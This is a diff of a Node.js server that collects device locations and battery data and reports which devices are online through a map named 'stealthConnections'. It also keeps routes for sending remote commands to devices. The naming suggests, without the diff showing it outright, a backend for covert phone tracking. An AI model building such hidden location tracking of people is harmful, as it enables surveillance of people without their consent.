@@ -363,24 +363,63 @@ app.get("/api/analytics/:deviceId/:token", async (req, res) => {
   }
 });
 
-app.get('/api/device/:deviceId/command/:token', (req, res) => {
-  const { deviceId, token } = req.params;
+app.get("/api/devices/:token", async (req, res) => {
+  const { token } = req.params;
+  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
 
-  if (token !== SECRET_TOKEN) {
-    return res.status(403).json({ error: "Forbidden" });
-  }
+  try {
+    const { data, error } = await supabase
+      .from("locations")
+      .select("device_id, device_name, latitude, longitude, timestamp, battery, accuracy")
+      .order("timestamp", { ascending: false });
 
-  const command = deviceCommands.get(deviceId);
+    if (error) throw error;
 
-  if (command && (Date.now() - command.timestamp) < 30000) {
-    deviceCommands.delete(deviceId);
-    return res.json({
-      action: command.action,
-      timestamp: command.timestamp
+    const devices = {};
+    const now = Date.now();
+
+    data.forEach((location) => {
+      if (!devices[location.device_id]) {
+        devices[location.device_id] = {
+          device_id: location.device_id,
+          device_name: location.device_name,
+          last_seen: location.timestamp,
+          battery: location.battery,
+          location_count: 0,
+          last_location: { lat: location.latitude, lng: location.longitude }
+        };
+      }
+      devices[location.device_id].location_count++;
     });
-  }
 
-  return res.json({ action: null });
+    // ✅ ДОБАВЛЯЕМ СТАТУС ИЗ WebSocket соединений
+    Object.keys(devices).forEach(deviceId => {
+      const info = stealthConnections.get(deviceId);
+      
+      // Проверяем: есть ли активное WebSocket соединение?
+      const isConnected = !!(info && isWsOpen(info.ws));
+      
+      // Проверяем: когда был последний ping?
+      const lastPing = info ? info.lastSeen : 0;
+      const timeSinceLastPing = now - lastPing;
+      
+      // Устройство ONLINE если:
+      // 1. WebSocket открыт
+      // 2. Последний ping < 30 секунд назад
+      devices[deviceId].is_connected = isConnected && (timeSinceLastPing < 30000);
+      
+      // Добавляем отладочную информацию
+      if (info) {
+        devices[deviceId].server_lastSeen = lastPing;
+        devices[deviceId].last_ping_seconds_ago = Math.floor(timeSinceLastPing / 1000);
+      }
+    });
+
+    return res.json(Object.values(devices));
+  } catch (err) {
+    console.error("Error in /api/devices:", err);
+    return res.status(500).json({ error: "Database error" });
+  }
 });
 
 app.post("/api/device/command", (req, res) => {
@@ -663,4 +702,5 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
